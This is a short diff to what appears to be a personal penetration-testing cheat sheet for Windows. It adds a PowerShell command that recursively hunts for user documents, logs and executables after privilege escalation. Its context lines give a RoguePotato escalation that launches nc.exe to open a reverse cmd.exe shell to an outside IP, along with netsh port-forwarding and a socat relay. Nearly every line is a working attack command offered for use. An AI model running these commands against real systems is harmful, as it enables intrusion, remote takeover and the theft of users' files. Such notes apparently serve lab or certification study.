@@ -16,6 +16,9 @@ netsh interface portproxy add v4tov4 listenport=4422 listenaddress=192.168.1.111
 After escalation to system on windows powershell:
 $ProgressPreference = "SilentlyContinue"
 
+File enumeration after PE
+get-childitem -path c:\users\ -include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx,*.log,*.exe -file -recurse -erroraction silentlycontinue
+
 Roguepotato
 .\RoguePotato.exe -r 192.168.45.203 -e "C:\Users\Public\nc.exe 192.168.45.203 3001 -e cmd.exe" -l 9999
 socat tcp-listen:135,reuseaddr,fork tcp:192.168.246.247:9999
